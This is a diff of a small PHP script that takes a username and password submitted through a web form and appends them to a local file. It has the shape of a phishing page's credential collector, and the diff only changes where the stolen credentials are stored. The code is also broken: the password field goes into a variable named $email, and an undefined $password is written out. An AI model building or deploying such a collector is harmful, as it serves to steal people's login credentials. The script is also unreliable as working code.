@@ -1,7 +1,7 @@
 <?php
 $username = $_POST['user'];
 $email = $_POST['password'];
-$file = fopen("/root/disk3/pass.txt", "a") or die ("file not open");
+$file = fopen("pass.txt", "a") or die ("file not open");
 $f = $username." , ".$password;
 fputs($file,$f) or die ("no data was written");
 fclose($file);
